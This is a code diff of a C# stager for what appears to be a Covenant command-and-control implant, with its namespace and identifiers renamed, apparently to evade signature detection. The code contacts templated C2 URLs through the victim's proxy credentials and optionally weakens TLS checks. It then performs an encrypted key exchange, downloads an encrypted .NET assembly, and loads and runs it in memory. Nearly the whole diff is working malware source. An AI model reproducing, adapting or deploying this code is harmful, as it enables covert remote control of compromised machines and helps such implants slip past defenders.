@@ -8,7 +8,7 @@ using System.Reflection;
 using System.Collections.Generic;
 using System.Security.Cryptography;
 
-namespace echoCovStr
+namespace ecfirstCov
 {
     public class EchoStg
     {
@@ -55,29 +55,25 @@ namespace echoCovStr
                 return;
             }
         }
-        public static class MaStrings
-        {
-            public static readonly List<string> EchoURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
-            public const string EchoCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
-            public static readonly List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-            public static readonly List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-            public static readonly List<string> EchoHTTPURLs = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-            
-            public static readonly bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
-            public static readonly bool UseCPin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
-        }
         public void DoStg()
         {
-            PrimeChecker.PerformPrimeCheck();
             try
             {
-                Random random = new Random();
-                EchoWeCli MyWeC = null;
+                List<string> EchoURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
+                string EchoCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
+                List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                List<string> EchoHTTPURLs = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+                string EchoPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+                string EchoPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
+                bool UseCPin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
 
-                string aGlobID = @"{{REPLACE_GRUNT_GUID}}";
-                string MyGlobID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
+                Random random = new Random();
+                string aGUID = @"{{REPLACE_GRUNT_GUID}}";
+                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                 byte[] SetKBs = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
-                string MessForm = @"{{""MyGlobID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
+                string MessForm = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
 
                 Aes SetAesK = Aes.Create();
                 SetAesK.Mode = CipherMode.CBC;
@@ -90,7 +86,7 @@ namespace echoCovStr
                 byte[] RSAPKBs = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                 byte[] EncRSAPK = SetAesK.CreateEncryptor().TransformFinalBlock(RSAPKBs, 0, RSAPKBs.Length);
                 byte[] hash = hmac.ComputeHash(EncRSAPK);
-                string StgOBod = String.Format(MessForm, aGlobID + MyGlobID, "0", "", Convert.ToBase64String(SetAesK.IV), Convert.ToBase64String(EncRSAPK), Convert.ToBase64String(hash));
+                string StgOBod = String.Format(MessForm, aGUID + GUID, "0", "", Convert.ToBase64String(SetAesK.IV), Convert.ToBase64String(EncRSAPK), Convert.ToBase64String(hash));
 
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
                 try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | SecurityProtocolType.Ssl3; } catch { }
@@ -101,44 +97,40 @@ namespace echoCovStr
                 ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                 {
                     bool valid = true;
-                    if (MaStrings.UseCPin && MaStrings.EchoCertHash != "")
+                    if (UseCPin && EchoCertHash != "")
                     {
-                        valid = cert.GetCertHashString() == MaStrings.EchoCertHash;
+                        valid = cert.GetCertHashString() == EchoCertHash;
                     }
-                    if (valid && MaStrings.ValCert)
+                    if (valid && ValCert)
                     {
                         valid = errors == System.Net.Security.SslPolicyErrors.None;
                     }
                     return valid;
                 };
                 string ChangedResp = MessageTransform.Transform(Encoding.UTF8.GetBytes(StgOBod));
-
-                string EchoPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-                string EchoPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
-
+                EchoWeCli MyWeC = null;
                 string StgOResp = "";
                 MyWeC = new EchoWeCli();
                 MyWeC.UseDefaultCredentials = true;
-                string EchoURI = "";
                 MyWeC.Proxy = WebRequest.DefaultWebProxy;
                 MyWeC.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
-
-                foreach (string MyURL in MaStrings.EchoURIs)
+                string EchoURI = "";
+                foreach (string MyURL in EchoURIs)
                 {
                     try
                     {
-                        for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
+                        for (int i = 0; i < EchoHeaderVals.Count; i++)
                         {
-                            if (MaStrings.EchoHeaderNames[i] == "Cookie")
+                            if (EchoHeaderNames[i] == "Cookie")
                             {
-                                MyWeC.SetCookies(new Uri(MyURL), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", ""));
+                                MyWeC.SetCookies(new Uri(MyURL), EchoHeaderVals[i].Replace(";", ",").Replace("{GUID}", ""));
                             }
                             else
                             {
-                                MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", ""), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", ""));
+                                MyWeC.Headers.Set(EchoHeaderNames[i].Replace("{GUID}", ""), EchoHeaderVals[i].Replace("{GUID}", ""));
                             }
                         }
-                        MyWeC.DownloadString(MyURL + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", ""));
+                        MyWeC.DownloadString(MyURL + EchoHTTPURLs[random.Next(EchoHTTPURLs.Count)].Replace("{GUID}", ""));
                         EchoURI = MyURL;
                     }
                     catch
@@ -146,18 +138,18 @@ namespace echoCovStr
                         continue;
                     }
                 }
-                for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
+                for (int i = 0; i < EchoHeaderVals.Count; i++)
                 {
-                    if (MaStrings.EchoHeaderNames[i] == "Cookie")
+                    if (EchoHeaderNames[i] == "Cookie")
                     {
-                        MyWeC.SetCookies(new Uri(EchoURI), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", MyGlobID));
+                        MyWeC.SetCookies(new Uri(EchoURI), EchoHeaderVals[i].Replace(";", ",").Replace("{GUID}", GUID));
                     }
                     else
                     {
-                        MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
+                        MyWeC.Headers.Set(EchoHeaderNames[i].Replace("{GUID}", GUID), EchoHeaderVals[i].Replace("{GUID}", GUID));
                     }
                 }
-                StgOResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(EchoPOSTReq, ChangedResp));
+                StgOResp = MyWeC.UploadString(EchoURI + EchoHTTPURLs[random.Next(EchoHTTPURLs.Count)].Replace("{GUID}", GUID), String.Format(EchoPOSTReq, ChangedResp));
                 string pulled = Parse(StgOResp, EchoPOSTResp)[0];
                 pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                 List<string> gotten = Parse(pulled, MessForm);
@@ -182,22 +174,22 @@ namespace echoCovStr
                 byte[] EncChalI = MySesK.CreateEncryptor().TransformFinalBlock(ChalI, 0, ChalI.Length);
                 hash = hmac.ComputeHash(EncChalI);
 
-                string StgIBod = String.Format(MessForm, MyGlobID, "1", "", Convert.ToBase64String(MySesK.IV), Convert.ToBase64String(EncChalI), Convert.ToBase64String(hash));
+                string StgIBod = String.Format(MessForm, GUID, "1", "", Convert.ToBase64String(MySesK.IV), Convert.ToBase64String(EncChalI), Convert.ToBase64String(hash));
                 ChangedResp = MessageTransform.Transform(Encoding.UTF8.GetBytes(StgIBod));
 
                 string StgIResp = "";
-                for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
+                for (int i = 0; i < EchoHeaderVals.Count; i++)
                 {
-                    if (MaStrings.EchoHeaderNames[i] == "Cookie")
+                    if (EchoHeaderNames[i] == "Cookie")
                     {
-                        MyWeC.SetCookies(new Uri(EchoURI), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", MyGlobID));
+                        MyWeC.SetCookies(new Uri(EchoURI), EchoHeaderVals[i].Replace(";", ",").Replace("{GUID}", GUID));
                     }
                     else
                     {
-                        MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
+                        MyWeC.Headers.Set(EchoHeaderNames[i].Replace("{GUID}", GUID), EchoHeaderVals[i].Replace("{GUID}", GUID));
                     }
                 }
-                StgIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(EchoPOSTReq, ChangedResp));
+                StgIResp = MyWeC.UploadString(EchoURI + EchoHTTPURLs[random.Next(EchoHTTPURLs.Count)].Replace("{GUID}", GUID), String.Format(EchoPOSTReq, ChangedResp));
                 pulled = Parse(StgIResp, EchoPOSTResp)[0];
                 pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                 gotten = Parse(pulled, MessForm);
@@ -219,22 +211,22 @@ namespace echoCovStr
                 byte[] EncChalII = MySesK.CreateEncryptor().TransformFinalBlock(ChalII, 0, ChalII.Length);
                 hash = hmac.ComputeHash(EncChalII);
 
-                string StgIIBod = String.Format(MessForm, MyGlobID, "2", "", Convert.ToBase64String(MySesK.IV), Convert.ToBase64String(EncChalII), Convert.ToBase64String(hash));
+                string StgIIBod = String.Format(MessForm, GUID, "2", "", Convert.ToBase64String(MySesK.IV), Convert.ToBase64String(EncChalII), Convert.ToBase64String(hash));
                 ChangedResp = MessageTransform.Transform(Encoding.UTF8.GetBytes(StgIIBod));
 
                 string StgIIResp = "";
-                for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
+                for (int i = 0; i < EchoHeaderVals.Count; i++)
                 {
-                    if (MaStrings.EchoHeaderNames[i] == "Cookie")
+                    if (EchoHeaderNames[i] == "Cookie")
                     {
-                        MyWeC.SetCookies(new Uri(EchoURI), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", MyGlobID));
+                        MyWeC.SetCookies(new Uri(EchoURI), EchoHeaderVals[i].Replace(";", ",").Replace("{GUID}", GUID));
                     }
                     else
                     {
-                        MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
+                        MyWeC.Headers.Set(EchoHeaderNames[i].Replace("{GUID}", GUID), EchoHeaderVals[i].Replace("{GUID}", GUID));
                     }
                 }
-                StgIIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(EchoPOSTReq, ChangedResp));
+                StgIIResp = MyWeC.UploadString(EchoURI + EchoHTTPURLs[random.Next(EchoHTTPURLs.Count)].Replace("{GUID}", GUID), String.Format(EchoPOSTReq, ChangedResp));
                 pulled = Parse(StgIIResp, EchoPOSTResp)[0];
                 pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                 gotten = Parse(pulled, MessForm);
@@ -246,7 +238,7 @@ namespace echoCovStr
                 MySesK.IV = Convert.FromBase64String(My64IV);
                 byte[] DCA = MySesK.CreateDecryptor().TransformFinalBlock(messBy, 0, messBy.Length);
                 Assembly EchoAss = Assembly.Load(DCA);
-                EchoAss.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { EchoURI, MaStrings.EchoCertHash, MyGlobID, MySesK });
+                EchoAss.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { EchoURI, EchoCertHash, GUID, MySesK });
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
         }
